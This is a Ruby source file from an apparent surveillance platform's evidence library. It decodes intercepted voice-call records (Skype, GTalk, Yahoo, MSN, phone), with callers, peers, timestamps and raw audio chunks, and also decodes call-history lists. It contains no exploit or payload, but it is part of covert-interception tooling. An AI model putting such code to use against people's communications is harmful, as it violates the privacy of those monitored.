
require 'rcs-common/evidence/common'

module RCS

module CallEvidence
  
  LOG_VOICE_VERSION = 2008121901
  CHANNEL = { 0 => :incoming, 1 => :outgoing }
  SOFTWARE = { 0x0141 => "Skype",
               0x0142 => "GTalk",
               0x0143 => "Yahoo",
               0x0144 => "Msn",
               0x0145 => "Phone",
               0x0146 => "Skype",
               0X0147 => "Msn" }
  
  def decode_additional_header(data)

    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.bytesize == 0
    
    stream = StringIO.new data
    version = read_uint32 stream
    
    raise EvidenceDeserializeError.new("invalid log version for voice call") unless version == LOG_VOICE_VERSION
    
    ret = Hash.new
    ret[:data] = Hash.new

    channel = read_uint32 stream
    ret[:data][:channel] = CHANNEL[channel]

    software = read_uint32 stream
    ret[:data][:program] = SOFTWARE[software]

    ret[:data][:sample_rate] = read_uint32 stream
    ret[:data][:incoming] = read_uint32 stream

    low, high = stream.read(8).unpack 'L2'
    ret[:data][:start_time] = Time.from_filetime high, low
    low, high = stream.read(8).unpack 'L2'
    ret[:data][:stop_time] = Time.from_filetime high, low
    
    caller_len = read_uint32 stream
    callee_len = read_uint32 stream
    
    ret[:data][:peer] = "<unknown>" if callee_len == 0

    ret[:data][:caller] ||= stream.read(caller_len).utf16le_to_utf8.lstrip.rstrip if caller_len != 0
    ret[:data][:peer] ||= stream.read(callee_len).utf16le_to_utf8.lstrip.rstrip if callee_len != 0

    ret
  end
  
  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new

    info[:data][:grid_content] = chunks.join

    info[:end_call] = true if info[:data][:grid_content] == "\xff\xff\xff\xff"
    info[:end_call] ||= false

    yield info if block_given?
    :keep_raw
  end
end

module CalllistEvidence

  def content
    raise "Not implemented!"
  end

  def generate_content
    raise "Not implemented!"
  end

  def decode_content(common_info, chunks)

    info = Hash[common_info]
    info[:data] ||= Hash.new

    stream = StringIO.new chunks.join

    @call_list = CallListSerializer.new.unserialize stream

    info[:data][:peer] = @call_list.fields[:number]
    info[:data][:peer] += " (#{@call_list.fields[:name]})" unless @call_list.fields[:name].nil?
    info[:data][:program] = 'Phone'
    info[:data][:status] = :history
    info[:data][:duration] = @call_list.end_time - @call_list.start_time
    info[:data][:incoming] = (@call_list.properties.include? :incoming) ? 1 : 0

    yield info if block_given?
    :delete_raw
  end

end # ::CalllistEvidence

end # RCS::